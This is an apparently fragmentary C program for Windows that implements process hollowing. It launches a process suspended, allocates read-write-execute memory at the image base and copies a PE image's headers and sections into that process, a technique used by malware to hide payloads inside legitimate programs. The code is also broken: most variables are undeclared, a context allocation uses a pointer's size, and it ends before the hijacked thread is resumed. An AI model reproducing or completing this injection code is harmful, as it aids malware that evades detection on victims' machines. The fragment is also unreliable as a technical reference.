#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <winnt.h>
#include <intrin.h>
#include <shlwapi.h>


#pragma comment(lib, "shlwapi.lib")
#define g(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)


int main(void) {

    if (CreateProcessA(path, 0, 0, 0, false, CREATE_SUSPENDED, 0, 0, &SI, &PI))
    {
        // Allocate memory for the context.
        CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
        CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

        // Retrieve the context.
        if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
        {
            pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
                NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

            // File Mapping
            WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
            for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
                WriteProcessMemory
                (
                    PI.hProcess,
                    LPVOID((size_t)pImageBase + SectionHeader[i].VirtualAddress),
                    LPVOID((size_t)Image + SectionHeader[i].PointerToRawData),
                    SectionHeader[i].SizeOfRawData,
                    0
                );
        }
    }


    return 0;
}